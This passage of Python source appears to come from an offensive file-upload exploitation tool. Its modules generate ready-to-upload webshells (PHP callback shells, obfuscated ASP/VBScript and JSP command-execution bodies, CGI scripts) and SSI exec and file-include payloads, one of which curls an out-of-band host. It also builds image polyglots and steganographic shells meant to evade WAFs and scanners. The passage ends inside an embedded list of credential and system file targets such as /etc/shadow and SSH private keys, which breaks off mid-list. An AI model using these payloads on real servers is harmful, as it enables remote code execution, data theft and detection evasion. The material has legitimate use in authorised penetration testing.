    png_text  = _png_text_payload(idat_code)

    variants = []
    for shell_name, shell_bytes in SHELLS.items():
        if not shell_name.startswith("php"):
            continue
        for ext in EXTENSIONS["php"]:
            for cased in case_variants(ext):
                base = ctx.rnd_name()
                variants.append((base + "." + cased, shell_bytes, get_mime(ext)))
                variants.append((base + "." + cased, b"GIF89a" + shell_bytes, "image/gif"))
                variants.append((base + "." + cased, magic_j + shell_bytes, "image/jpeg"))
                if ext in ["php", "phtml", "phar"]:
                    variants.append((base + "." + cased, png_text, "image/png"))
                    variants.append((base + "." + cased, GD_SURVIVOR_GIF, "image/gif"))

    exts = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    magic = MAGIC.get(allowed, b"")

    for label, php_bytes in _php_disable_func_payloads(param, _SO_X64_HEX, _SO_X32_HEX):
        for ext in exts:
            for mbytes in [b"", magic]:
                for mime in [get_mime(ext), get_mime(allowed)]:
                    variants.append((ctx.rnd_name() + "." + ext, mbytes + php_bytes, mime))

    req = '$_REQUEST["' + param + '"]'
    for shell in _php_callback_shells(param):
        for ext in exts:
            for mbytes in [b"", magic]:
                for mime in [get_mime(ext), get_mime(allowed)]:
                    variants.append((ctx.rnd_name() + "." + ext, mbytes + shell, mime))

    adv_callback = [
        (b'<?php array_udiff_assoc(array(' + req.encode() + b'), array(1), "assert"); ?>'),
        (b'<?php $key=substr(__FILE__,-5,-4);${"LandGrey"}=$_SERVER["HTTP_ACCEPT"]."Land!";'
         b'$f=pack("H*","13"."3f120b1655")^$LandGrey;'
         b'array_intersect_uassoc(array(' + req.encode() + b'=>""),array(1),$f); ?>'),
        (b'<?php $key=substr(__FILE__,-5,-4);${"LandGrey"}=$key."Land!";'
         b'$f=pack("H*","13"."3f120b1655")^$LandGrey;'
         b'array_intersect_uassoc(array(' + req.encode() + b'=>""),array(1),$f); ?>'),
        (b'<?php ${"LandGrey"}=substr(__FILE__,-5,-4)."class";'
         b'$f=$LandGrey^hex2bin("12101f040107");'
         b'array_intersect_uassoc(array(' + req.encode() + b'=>""),array(1),$f); ?>'),
        (b'<?php $ch=$_COOKIE["set-domain-name"];'
         b'array_intersect_ukey(array(' + req.encode() + b'=>1),array(1),$ch."ert"); ?>'),
        (b'<?php $ch=explode(".","hello.ass.world.er.t");'
         b'array_intersect_ukey(array(' + req.encode() + b'=>1),array(1),$ch[1].$ch[3].$ch[4]); ?>'),
        (b'<?php $wx=substr($_SERVER["HTTP_REFERER"],-7,-4);'
         b'forward_static_call_array($wx."ert",array(' + req.encode() + b')); ?>'),
        (b'<?php $f="sys"."tem";'
         b'register_shutdown_function($f,' + req.encode() + b'); ?>'),
    ]
    for shell in adv_callback:
        for ext in exts:
            for mbytes in [b"", magic]:
                for mime in [get_mime(ext), get_mime(allowed)]:
                    variants.append((ctx.rnd_name() + "." + ext, mbytes + shell, mime))

    run_variants(ctx, variants, "php_rce")


@module("asp_rce")
def mod_asp_rce(ctx: UploadContext):
    """ASP RCE: classic .asp + semicolon bypass (.asp;.jpg) + null byte + .asa + .asax."""
    info("asp_rce — ASP/ASPX + .asp;.jpg + .asp%00.jpg + .asa/.asax variants")
    allowed = ctx.opts.allowed or "jpg"
    magic   = MAGIC.get(allowed, b"")
    shell   = SHELLS["asp"]

    variants = []
    for ext in EXTENSIONS["asp"]:
        base = ctx.rnd_name()
        # Direct
        variants.append((base + "." + ext,             shell, get_mime(ext)))
        # Semicolon IIS bypass
        variants.append((base + f".{ext};.{allowed}",  shell, get_mime(allowed)))
        # Null byte variants
        variants.append((base + f".{ext}%00.{allowed}",shell, get_mime(allowed)))
        variants.append((base + f".{ext}\x00.{allowed}",shell, get_mime(allowed)))
        # Magic bytes
        variants.append((base + "." + ext,             magic + shell, get_mime(allowed)))
    run_variants(ctx, variants, "asp_rce")


@module("asp_obfuscation")
def mod_asp_obfuscation(ctx: UploadContext):
    """ASP/VBScript source obfuscation — the ASP counterpart of php_obfuscation.
    Bypasses WAFs / signature scanners that pattern-match plain ASP shells:
      1. HTML-comment annotation  (<%<!--"-->…)         — LandGrey_html_annotator
      2. Chr() string-concatenation of the shell body    — LandGrey_activex
      3. Chr()-arithmetic decoder (offset 66)            — LandGrey_glorysday
      4. UTF-7 codepage=65000 body                        — LandGrey_utf7
      5. VBScript.Encode (#@~^…^#~@) static blob          — LandGrey_vbencode
      6. MSScriptControl.ScriptControl ActiveX eval
      7. <script runat=server> VBScript injection         — r00ts_firewall_bypass
    Plus folded JFIF / GIF89a + ASP-shell polyglots (the JPEG+ASPX gap).
    """
    info("asp_obfuscation — HTMLcomment/Chr/arith/UTF-7/VBScript.Encode/ScriptControl/runat")
    exts    = EXTENSIONS["asp"]
    allowed = ctx.opts.allowed or "jpg"
    magic   = MAGIC.get(allowed, b"")
    param   = getattr(ctx.opts, "cmd_param", "cmd") or "cmd"

    # Inner VBScript that runs the shell, reading the chosen request parameter.
    inner = (f'Response.Write(CreateObject("WScript.Shell")'
             f'.Exec(Request("{param}")).StdOut.ReadAll())')

    def _chr_concat(s: str) -> str:
        return "&".join(f"Chr({ord(c)})" for c in s)

    # 1. HTML-comment annotation — the <!--"--> confuses naive parsers/WAFs.
    asp_htmlcomment = (f'<%\r\n<!--"-->\r\nExecute Request("{param}")\r\n%>').encode()
    # 2. Chr() string-concat of the whole shell body.
    asp_chr = (f'<% Execute({_chr_concat(inner)}) %>').encode()
    # 3. Chr()-arithmetic decoder: "%"-joined (ord+66) values + Chr(n-66) loop.
    enc = "".join("%" + str(ord(c) + 66) for c in inner)
    asp_arith = (f'<%<!--"-->\r\nExecute(fun("{enc}"))\r\n'
                 f'Function fun(s)\r\ns=Split(s,"%")\r\n'
                 f'For x=1 To Ubound(s)\r\nfun=fun&Chr(s(x)-66)\r\nNext\r\n'
                 f'End Function\r\n%>').encode()
    # 6. ScriptControl ActiveX eval.
    asp_sc = (f'<%\r\nSet o=Server.CreateObject("MSScriptControl.ScriptControl")\r\n'
              f'o.Language="VBScript"\r\no.AddObject "Response",Response\r\n'
              f'o.AddObject "Request",Request\r\n'
              f'o.ExecuteStatement "Execute(Request(""{param}""))"\r\n%>').encode()
    # 7. <script runat=server> injection.
    asp_runat = (f'<script language=vbscript runat=server>\r\n'
                 f'If Request("{param}")<>"" Then Execute Request("{param}")\r\n'
                 f'</script>').encode()

    plain_obf = [asp_htmlcomment, asp_chr, asp_arith, asp_sc, asp_runat]

    # 4. UTF-7 codepage body — force the whole body into the +<base64(UTF-16BE)>-
    #    modified-base64 form (a plain .encode('utf-7') would leave ASCII literal).
    decoded   = f"Response.CodePage=65001:{inner}"
    u7_body   = base64.b64encode(decoded.encode("utf-16-be")).decode().rstrip("=")
    asp_utf7  = (b"<%@codepage=65000%>\r\n<%\r\n+" + u7_body.encode() + b"-\r\n%>")
    # 5. VBScript.Encode static blob (fixed 'cmd' param — see ASP_VBE_BLOB).
    asp_vbe   = ASP_VBE_BLOB
    directive_obf = [asp_utf7, asp_vbe]   # leading directive must be the first bytes

    variants = []
    # Plain <% %> bodies — combine with optional magic-byte prefix + spoofed MIME.
    for body in plain_obf:
        for ext in exts:
            for mbytes in [b"", magic]:
                for mime in [get_mime(ext), get_mime(allowed)]:
                    variants.append((ctx.rnd_name() + "." + ext, mbytes + body, mime))
    # Directive-bearing bodies — must start the file, so no magic prefix.
    for body in directive_obf:
        for ext in exts:
            for mime in [get_mime(ext), get_mime(allowed)]:
                variants.append((ctx.rnd_name() + "." + ext, body, mime))
    # Folded polyglots: real JFIF / GIF89a header + plain ASP shell.
    asp_shell = SHELLS["asp"]
    for ext in exts:
        variants.append((ctx.rnd_name() + "." + ext, MAGIC.get("jpg", b"") + b"\n" + asp_shell, "image/jpeg"))
        variants.append((ctx.rnd_name() + "." + ext, b"GIF89a" + asp_shell, "image/gif"))
    run_variants(ctx, variants, "asp_obfuscation")


@module("jsp_rce")
def mod_jsp_rce(ctx: UploadContext):
    """JSP RCE: expression language, tag-based, JSPX, GIF+JSP polyglot."""
    info("jsp_rce — JSP EL / tags / JSPX + GIF polyglot")
    variants = []
    for ext in EXTENSIONS["jsp"]:
        for cased in case_variants(ext):
            base = ctx.rnd_name()
            # Expression language
            variants.append((base+"."+cased, SHELLS["jsp_el"], get_mime(ext)))
            # Classic tags
            variants.append((base+"."+cased, SHELLS["jsp"],    get_mime(ext)))
            # GIF89a polyglot
            variants.append((base+"."+cased, b"GIF89a\n" + SHELLS["jsp_el"], "image/gif"))
    run_variants(ctx, variants, "jsp_rce")


@module("jsp_obfuscation")
def mod_jsp_obfuscation(ctx: UploadContext):
    """JSP source obfuscation — the JSP counterpart of php_obfuscation.
    Hides the exec call from signature scanners:
      1. ProcessBuilder (direct + output-reading)         — ProcessBuilder-cmd
      2. byte-array (decimal ASCII) masking of cmd/args    — Runtime-reflect-cmd
      3. reflection + Base64 (Class.forName/getMethod)     — ProcessBuilder-reflect
      4. full \\uXXXX unicode-escaped scriptlet body        — CaiDao/Behinder
    Plus folded GIF89a / JFIF + JSP-shell polyglots.
    """
    info("jsp_obfuscation — ProcessBuilder/byte-array/reflection+Base64/unicode-escape")
    exts    = EXTENSIONS["jsp"]
    allowed = ctx.opts.allowed or "jpg"
    magic   = MAGIC.get(allowed, b"")
    param   = getattr(ctx.opts, "cmd_param", "cmd") or "cmd"

    def _jbytes(s: str) -> str:
        return "new String(new byte[]{" + ",".join(str(b) for b in s.encode()) + "})"

    b64_rt   = base64.b64encode(b"java.lang.Runtime").decode()
    b64_exec = base64.b64encode(b"exec").decode()
    b64_grt  = base64.b64encode(b"getRuntime").decode()

    # 1. ProcessBuilder — direct + output-reading scriptlet.
    jsp_pb_simple = (f'<% new ProcessBuilder(request.getParameter("{param}"))'
                     f'.start(); %>').encode()
    jsp_pb_output = (f'<% java.io.InputStream is=new ProcessBuilder('
                     f'{_jbytes("cmd")},{_jbytes("/C")},request.getParameter("{param}"))'
                     f'.start().getInputStream();int _c;'
                     f'while((_c=is.read())!=-1){{out.print((char)_c);}} %>').encode()
    # 2. byte-array masking of the whole ProcessBuilder argv.
    jsp_bytearray = (f'<% new ProcessBuilder({_jbytes("/bin/bash")},{_jbytes("-c")},'
                     f'request.getParameter("{param}")).start(); %>').encode()
    # 3. reflection + Base64 (java.util.Base64 → broad compat).
    jsp_reflect = (
        f'<% Class _r=Class.forName(new String(java.util.Base64.getDecoder()'
        f'.decode("{b64_rt}")));_r.getMethod(new String(java.util.Base64'
        f'.getDecoder().decode("{b64_exec}")),String.class).invoke('
        f'_r.getMethod(new String(java.util.Base64.getDecoder().decode("{b64_grt}")))'
        f'.invoke(null),request.getParameter("{param}")); %>').encode()
    # 4. full \uXXXX unicode-escaped scriptlet body (javac decodes \u in source).
    src = f'Runtime.getRuntime().exec(request.getParameter("{param}"));'
    jsp_unicode = (b"<%" + "".join("\\u%04x" % ord(c) for c in src).encode() + b"%>")

    plain_obf = [jsp_pb_simple, jsp_pb_output, jsp_bytearray, jsp_reflect, jsp_unicode]

    variants = []
    for body in plain_obf:
        for ext in exts:
            for cased in case_variants(ext):
                for mbytes in [b"", magic]:
                    for mime in [get_mime(ext), get_mime(allowed)]:
                        variants.append((ctx.rnd_name() + "." + cased, mbytes + body, mime))
    # Folded polyglots: GIF89a / JFIF header + plain JSP shell.
    jsp_shell = SHELLS["jsp"]
    for ext in exts:
        variants.append((ctx.rnd_name() + "." + ext, b"GIF89a\n" + jsp_shell, "image/gif"))
        variants.append((ctx.rnd_name() + "." + ext, MAGIC.get("jpg", b"") + b"\n" + jsp_shell, "image/jpeg"))
    run_variants(ctx, variants, "jsp_obfuscation")


@module("cgi_rce")
def mod_cgi_rce(ctx: UploadContext):
    """CGI execution: Perl, Python, Ruby via .pl / .py / .rb / .cgi."""
    info("cgi_rce — Perl / Python / Ruby CGI scripts")
    variants = []
    for lang, exts, shell_key in [
        ("perl",   ["pl", "cgi"],   "pl"),
        ("python", ["py", "cgi"],   "py"),
        ("ruby",   ["rb"],          "rb"),
    ]:
        shell = SHELLS[shell_key]
        for ext in exts:
            base = ctx.rnd_name()
            for mime in [get_mime(ext), "text/x-script", "application/octet-stream"]:
                variants.append((base + "." + ext, shell, mime))
    run_variants(ctx, variants, "cgi_rce")


@module("ssi_injection")
def mod_ssi_injection(ctx: UploadContext):
    """Server Side Include injection via .shtml/.stm/.shtm/.html files.
    Includes:
      - echo probe (direct response detection)
      - nslookup blind detection (DNS-based, from UploadScanner)
      - OAST-based exec
      - /etc/passwd include
      - env var echo (DOCUMENT_NAME, SERVER_NAME)
    """
    info("ssi_injection — SSI exec (echo probe + nslookup DNS + OAST + LFI)")
    probe   = "".join(random.choices(string.ascii_uppercase, k=8))
    oast    = ctx.opts.oast or ""
    allowed = ctx.opts.allowed or "jpg"

    # Blind nslookup probe (DNS-based detection from UploadScanner)
    rand_domain = (
        f"{random.randint(100000,999999)}.{random.randint(100000,999999)}.upmap.local"
    )

    ssi_payloads = [
        # Direct detection via echo
        (f'<!--#exec cmd="echo {probe}" -->', probe),
        # System info
        ('<!--#exec cmd="id" -->', "uid="),
        ('<!--#exec cmd="whoami" -->', ""),
        # DNS-blind (nslookup — detection via "can't find" in response OR DNS OOB)
        (f'<!--#exec cmd="nslookup {rand_domain}" -->', f"can't find"),
        # LFI — path routed through _lfi(); signature blanked when overridden
        # because /etc/passwd's "root:" marker won't appear in other files
        # (e.g. /proc/self/environ), avoiding false negatives.
        (f'<!--#include virtual="{_lfi(ctx, "/etc/passwd")}" -->',
         "root:" if not getattr(ctx.opts, "file_read", None) else ""),
        (f'<!--#include file="{_lfi(ctx, "/etc/passwd")}" -->',
         "root:" if not getattr(ctx.opts, "file_read", None) else ""),
        # Env vars (leak server info)
        ('<!--#echo var="DOCUMENT_NAME" -->', ""),
        ('<!--#echo var="SERVER_NAME" -->', ""),
        ('<!--#echo var="DATE_LOCAL" -->', ""),
        # Printenv
        ('<!--#printenv -->', "DOCUMENT_ROOT"),
    ]
    if oast:
        oast_probe = "UpMapSSI" + "".join(random.choices(string.digits, k=6))
        ssi_payloads.append(
            (f'<!--#exec cmd="curl {oast}/{oast_probe}" -->', oast_probe)
        )

    variants = []
    for payload_str, _ in ssi_payloads:
        payload = payload_str.encode()
        for ext in ["shtml", "stm", "shtm", "html", allowed]:
            for mime in ["text/html", "text/plain", ""]:
                variants.append((ctx.rnd_name() + "." + ext, payload, mime or "text/html"))
    run_variants(ctx, variants, "ssi_injection")


@module("polyglot_php_jpeg")
def mod_polyglot_php_jpeg(ctx: UploadContext):
    """PHP+JPEG polyglot: real JFIF header + PHP appended (survives getimagesize())."""
    info("polyglot_php_jpeg — PHP+JPEG polyglot (real JFIF structure)")
    # Full minimal valid JPEG (1x1 white pixel) + appended PHP
    jpeg_1x1 = (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t"
        b"\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a"
        b"\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\x1e"
        b"\x1b\xfe\x00\x0bUpMapProbe\xff\xd9"
    )
    shell = SHELLS.get(ctx.opts.extension, SHELLS["php"])

    variants = []
    for ext in EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension]):
        for mime in ["image/jpeg", "image/png", get_mime(ctx.opts.allowed or "jpg")]:
            variants.append((ctx.rnd_name() + "." + ext, jpeg_1x1 + b"\n" + shell, mime))
    run_variants(ctx, variants, "polyglot_php_jpeg")


@module("image_steganography")
def mod_image_steganography(ctx: UploadContext):
    """True image steganography — PHP shell embedded inside valid JPEG/PNG/GIF structure.
    Not appended at the end (caught by re-encode), but hidden inside:
      - JPEG COM comment segment
      - JPEG APP1/EXIF user-comment field
      - PNG tEXt chunk payload
      - GIF extension block comment
      - BMP reserved header bytes
    Survives getimagesize(), imagecreatefromjpeg(), imagepng() in some configs.
    From AutoShell technique 5.
    """
    info("image_steganography — shell in JPEG COM / PNG tEXt / GIF comment / EXIF")
    exts    = EXTENSIONS.get(ctx.opts.extension, [ctx.opts.extension])
    allowed = ctx.opts.allowed or "jpg"
    # Use compact detection shell (avoids large payload in image header)
    probe  = "UpMapStego" + "".join(random.choices(string.digits, k=6))
    shell  = f"<?php echo '{probe}';system($_GET['cmd']); ?>".encode()

    def make_jpeg_com(payload: bytes) -> bytes:
        """JPEG with PHP shell in COM (comment) segment — comes before image data."""
        com_seg = b"\xFF\xFE" + len(payload + b"\x00").to_bytes(2, "big") + payload + b"\x00"
        # Minimal 1×1 white JPEG body
        jpeg_body = (
            b"\xFF\xD8"                          # SOI
            + com_seg                             # COM segment with shell
            + b"\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"  # APP0
            + b"\xFF\xDB\x00C\x00" + bytes([8,6,6,7,6,5,8,7,7,7,9,9,8,10,12,20,13,12,11,11])
            + bytes([12,25,18,19,15,20,29,26,31,30,29,26,28,28,32,36,46,39,32,34,44,35])
            + bytes([28,28,40,55,41,44,48,49,52,52,52,31,39,57,61,56,50,60,46,51,52,50])
            + b"\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00"
            + b"\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B"
            + b"\xFF\xDA\x00\x08\x01\x01\x00\x00?\x00\xF5\x14\xFF\xD9"  # SOS + minimal scan + EOI
        )
        return jpeg_body

    def make_jpeg_exif(payload: bytes) -> bytes:
        """JPEG with PHP in EXIF UserComment field (APP1 segment)."""
        # EXIF structure: APP1 marker + length + "Exif\x00\x00" + TIFF header + IFD
        # UserComment tag = 0x9286, type = UNDEFINED, with ASCII header
        user_comment = b"ASCII\x00\x00\x00" + payload
        # Minimal EXIF blob (little-endian TIFF)
        tiff  = b"II\x2A\x00\x08\x00\x00\x00"  # LE TIFF header, IFD at offset 8
        count = (1).to_bytes(2, "little")         # 1 IFD entry
        # Tag 0x9286 (UserComment), type 7 (UNDEFINED), count = len, offset = after IFD
        ifd_offset = 8 + 2 + 12 + 4              # after IFD entries + next_ifd
        entry = (b"\x86\x92"                      # tag 0x9286
                 + b"\x07\x00"                    # UNDEFINED
                 + len(user_comment).to_bytes(4, "little")
                 + ifd_offset.to_bytes(4, "little"))
        exif_data = tiff + count + entry + b"\x00\x00\x00\x00" + user_comment
        app1 = b"\xFF\xE1" + (len(exif_data) + 8).to_bytes(2, "big") + b"Exif\x00\x00" + exif_data
        return b"\xFF\xD8" + app1 + b"\xFF\xD9"

    def make_png_text_chunk(payload: bytes) -> bytes:
        """PNG with PHP in tEXt chunk (keyword=Comment)."""
        chunk_data = b"Comment\x00" + payload
        crc_val = zlib.crc32(b"tEXt" + chunk_data) & 0xffffffff
        chunk = struct.pack(">I", len(chunk_data)) + b"tEXt" + chunk_data + struct.pack(">I", crc_val)
        # Minimal 1×1 PNG
        ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        ihdr_crc  = zlib.crc32(b"IHDR" + ihdr_data) & 0xffffffff
        ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + struct.pack(">I", ihdr_crc)
        idat_data = zlib.compress(b"\x00\xff\xff\xff")
        idat_crc  = zlib.crc32(b"IDAT" + idat_data) & 0xffffffff
        idat = struct.pack(">I", len(idat_data)) + b"IDAT" + idat_data + struct.pack(">I", idat_crc)
        iend_crc  = zlib.crc32(b"IEND") & 0xffffffff
        iend = struct.pack(">I", 0) + b"IEND" + struct.pack(">I", iend_crc)
        return b"\x89PNG\r\n\x1a\n" + ihdr + chunk + idat + iend

    def make_gif_comment(payload: bytes) -> bytes:
        """GIF89a with PHP in comment extension block."""
        # Comment Extension: 0x21 0xFE, sub-block, 0x00
        chunks = []
        data = payload
        while data:
            block = data[:255]
            data  = data[255:]
            chunks.append(bytes([len(block)]) + block)
        comment_ext = b"\x21\xFE" + b"".join(chunks) + b"\x00"
        # Minimal 1×1 GIF body
        gif_body = (
            b"GIF89a\x01\x00\x01\x00\x80\x01\x00\xff\xff\xff\x00\x00\x00"
            + comment_ext
            + b"!\xf9\x04\x00\x00\x00\x00\x00"     # GCE
            + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
        )
        return gif_body

    stego_images = [
        ("jpg", make_jpeg_com(shell),   "image/jpeg"),
        ("jpg", make_jpeg_exif(shell),  "image/jpeg"),
        ("png", make_png_text_chunk(shell), "image/png"),
        ("gif", make_gif_comment(shell), "image/gif"),
    ]

    variants = []
    for img_ext, img_data, img_mime in stego_images:
        # Test with original image extension (most permissive)
        variants.append((ctx.rnd_name() + "." + img_ext, img_data, img_mime))
        variants.append((ctx.rnd_name() + "." + img_ext, img_data, ""))
        # Also with actual backend extension — some servers check content not ext
        for ext in exts[:3]:
            variants.append((ctx.rnd_name() + "." + ext, img_data, img_mime))
    run_variants(ctx, variants, "image_steganography")


# ─────────────────────────────────────────────────────────────────────────────
# Local-file-read target resolver — every LFI-bearing payload across the modules
# below routes its file path through _lfi(ctx, default). When the operator passes
# --file-read PATH the override wins; otherwise the per-payload default (passwd /
# win.ini / hostname / hosts / boot.ini / lsb-release / ...) is used unchanged.
# Lives here because 9 of the 10 callers are in XXE; the SSRF/ESI/SSI/Ghostscript
# call sites import it via the normal module-global lookup.
# ─────────────────────────────────────────────────────────────────────────────
def _lfi(ctx: "UploadContext", default: str) -> str:
    """Resolve a local-file-read target. Returns --file-read if set, else the
    per-payload hardcoded default. Pass an absolute filesystem path
    (e.g. '/etc/passwd' or '/c:/windows/win.ini'); the caller embeds the
    result into its own URI scheme (file://, php://filter resource=, etc.).
    --file-read accepts either a literal path OR an @key.path lookup into
    the embedded paths.json registry (e.g. '@linux.credentials.id_rsa',
    '@devops_cloud.kubernetes'); when @key resolves to many leaves the FIRST
    wins (override mode is single-target — use Upname for fan-out).
    known_cve_endpoints intentionally does NOT call this — it keeps its
    Struts ViewFile PoC 'index' target verbatim."""
    fr = getattr(ctx.opts, "file_read", None)
    if not fr:
        return default
    if fr.startswith("@"):
        resolved = _resolve_paths_key(fr)
        return resolved[0] if resolved else default
    return fr


# ─── BEGIN EMBEDDED PATHS (auto-generated by _embed_paths.py) ────────────
# Source of truth: paths.json (sibling file). Re-embed: _embed_paths.py.
_EMBEDDED_PATHS_JSON = r'''
{
  "$schema_version": 1,
  "$description": "Canonical known-file-paths registry. Consumed by UpMap, UpGen, and Upname to populate --file-read overrides (XXE/LFI/SSRF targets) and to build path-traversal payloads (../../../{path}) in Upname's filename-injection attack family.",
  "$consumers": {
    "UpMap.py":  "--file-read PATH routes every _lfi(ctx, …) site through the registry (XXE/SSI/SSRF/CSV/Ghostscript). Accepts a literal path OR @key.path into .linux / .windows / .devops_cloud / .cloud_metadata_endpoints.",
    "UpGen.py":  "--file-read PATH routes every _lfi/_lfi_urlenc/_lfi_charref site through the registry. Accepts the same literal-or-@key forms.",
    "Upname.py": "path_traversal attack reads .webroots.<lang>.<os> as the drop target and .linux / .windows / .devops_cloud / .cloud_metadata_endpoints as the read target."
  },
  "$placeholders": {
    "{USER}":       "non-root username on shared hosting / multi-user box",
    "{DOMAIN}":     "vhost domain name (e.g. example.com)",
    "{APP}":        "IIS site/application name",
    "{VERSION}":    "tool-specific version segment (e.g. PHP 8.2, PostgreSQL 14)",
    "{TOMCAT_VER}": "Tomcat major.minor (e.g. 9.0, 10.1)",
    "{YYMMDD}":     "IIS log date suffix",
    "{HOSTNAME}":   "machine short hostname (used in MySQL/XAMPP .err file names)"
  },

  "linux": {
    "system_info": [
      "/etc/passwd",
      "/etc/group",
      "/etc/hostname",
      "/etc/hosts",
      "/etc/issue",
      "/etc/issue.net",
      "/etc/os-release",
      "/etc/lsb-release",
      "/etc/redhat-release",
      "/etc/debian_version",
      "/etc/motd",
      "/etc/timezone",
      "/etc/machine-id",
      "/etc/fstab",
      "/etc/profile",
      "/etc/bash.bashrc",
      "/etc/environment"
    ],

    "network": [
      "/etc/resolv.conf",
      "/etc/network/interfaces",
      "/etc/netplan/01-netcfg.yaml",
      "/etc/netplan/50-cloud-init.yaml",
      "/etc/sysconfig/network",
      "/etc/sysconfig/network-scripts/ifcfg-eth0",
      "/proc/net/tcp",
      "/proc/net/tcp6",
      "/proc/net/udp",
      "/proc/net/route",
      "/proc/net/arp",
      "/proc/net/fib_trie",
      "/proc/net/unix",
      "/etc/iptables/rules.v4",
      "/etc/iptables/rules.v6",
      "/etc/nftables.conf"
    ],

    "process_runtime": [
      "/proc/self/environ",
      "/proc/self/cmdline",
      "/proc/self/status",
      "/proc/self/stat",
      "/proc/self/maps",
      "/proc/self/cwd",
      "/proc/self/exe",
      "/proc/self/root",
      "/proc/self/fd/0",
      "/proc/self/fd/1",
      "/proc/self/fd/2",
      "/proc/self/fd/3",
      "/proc/self/io",
      "/proc/self/limits",
      "/proc/self/mountinfo",
      "/proc/self/mounts",
      "/proc/version",
      "/proc/cmdline",
      "/proc/cpuinfo",
      "/proc/meminfo",
      "/proc/mounts",
      "/proc/loadavg",
      "/proc/uptime",
      "/proc/modules",
      "/proc/1/environ",
      "/proc/1/cmdline",
      "/proc/1/status"
    ],

    "credentials": [
      "/etc/shadow",
      "/etc/gshadow",
      "/etc/sudoers",
      "/etc/sudoers.d/",
      "/etc/security/opasswd",
      "/etc/security/passwd",
      "/etc/security/group",
      "/etc/pam.d/common-auth",
      "/root/.ssh/id_rsa",
      "/root/.ssh/id_dsa",
      "/root/.ssh/id_ecdsa",
      "/root/.ssh/id_ed25519",
      "/root/.ssh/authorized_keys",
      "/root/.ssh/known_hosts",
      "/root/.ssh/config",
      "/home/{USER}/.ssh/id_rsa",
      "/home/{USER}/.ssh/id_ed25519",
      "/home/{USER}/.ssh/authorized_keys",
      "/home/{USER}/.ssh/known_hosts",
      "/home/{USER}/.ssh/config",
      "/etc/ssh/sshd_config",
      "/etc/ssh/ssh_config",
      "/etc/ssh/ssh_host_rsa_key",
      "/etc/ssh/ssh_host_ecdsa_key",
      "/etc/ssh/ssh_host_ed25519_key",
      "/etc/ssh/ssh_host_dsa_key",
      "/root/.netrc",
      "/home/{USER}/.netrc",
      "/root/.pgpass",
      "/home/{USER}/.pgpass",
      "/root/.my.cnf",
      "/home/{USER}/.my.cnf"
    ],

    "shell_history": [
      "/root/.bash_history",
      "/root/.zsh_history",
      "/root/.sh_history",
      "/root/.ash_history",
      "/root/.lesshst",
      "/root/.viminfo",
      "/root/.nano_history",
      "/root/.python_history",
      "/root/.mysql_history",
      "/root/.psql_history",
      "/root/.rediscli_history",
      "/root/.sqlite_history",
      "/root/.node_repl_history",
      "/root/.irb_history",
      "/root/.local/share/recently-used.xbel",
      "/home/{USER}/.bash_history",
      "/home/{USER}/.zsh_history",
      "/home/{USER}/.python_history",
      "/home/{USER}/.mysql_history",
      "/home/{USER}/.psql_history",
      "/home/{USER}/.viminfo",
      "/home/{USER}/.lesshst"
    ],

    "logs": [
      "/var/log/auth.log",
      "/var/log/syslog",
      "/var/log/messages",
      "/var/log/secure",
      "/var/log/dmesg",
      "/var/log/kern.log",
      "/var/log/boot.log",
      "/var/log/wtmp",
      "/var/log/btmp",
      "/var/log/lastlog",
      "/var/log/utmp",
      "/var/log/faillog",
      "/var/log/audit/audit.log",
      "/var/log/cron",
      "/var/log/cron.log",
      "/var/log/maillog",
      "/var/log/mail.log",
      "/var/log/apache2/access.log",
      "/var/log/apache2/error.log",
      "/var/log/apache2/other_vhosts_access.log",
      "/var/log/httpd/access_log",
      "/var/log/httpd/error_log",
      "/var/log/nginx/access.log",
      "/var/log/nginx/error.log",
      "/var/log/mysql/error.log",
      "/var/log/mysql/mysql.log",
      "/var/log/mysql/mysql-slow.log",
      "/var/log/mariadb/mariadb.log",
      "/var/log/postgresql/postgresql-{VERSION}-main.log",
      "/var/log/redis/redis-server.log",
      "/var/log/php_errors.log",
      "/var/log/php-fpm/error.log",
      "/var/log/tomcat9/catalina.out",
      "/var/log/tomcat/catalina.out"
    ],

    "scheduled_tasks": [
      "/etc/crontab",
      "/etc/cron.d/",
      "/etc/cron.hourly/",
      "/etc/cron.daily/",
      "/etc/cron.weekly/",
      "/etc/cron.monthly/",
      "/etc/anacrontab",
      "/var/spool/cron/crontabs/root",
      "/var/spool/cron/crontabs/{USER}",
      "/var/spool/cron/{USER}",
      "/etc/at.allow",
      "/etc/at.deny",
      "/etc/systemd/system/",
      "/lib/systemd/system/",
      "/usr/lib/systemd/system/"
    ],

    "mail_spool": [
      "/var/spool/mail/root",
      "/var/spool/mail/{USER}",
      "/var/mail/root",
      "/var/mail/{USER}",
      "/var/spool/exim4/input/",
      "/var/spool/postfix/maildrop/"
    ],

    "app_configs": [
      "/etc/php/{VERSION}/fpm/php.ini",
      "/etc/php/{VERSION}/cli/php.ini",
      "/etc/php/{VERSION}/fpm/pool.d/www.conf",
      "/etc/php.ini",
      "/usr/local/etc/php/php.ini",
      "/etc/mysql/my.cnf",
      "/etc/mysql/mariadb.conf.d/50-server.cnf",
      "/etc/mysql/conf.d/mysql.cnf",
      "/etc/postgresql/{VERSION}/main/postgresql.conf",
      "/etc/postgresql/{VERSION}/main/pg_hba.conf",
      "/etc/redis/redis.conf",
      "/etc/redis.conf",
      "/etc/memcached.conf",
      "/etc/mongod.conf",
      "/etc/elasticsearch/elasticsearch.yml",
      "/etc/apache2/apache2.conf",
      "/etc/apache2/ports.conf",
      "/etc/apache2/sites-enabled/000-default.conf",
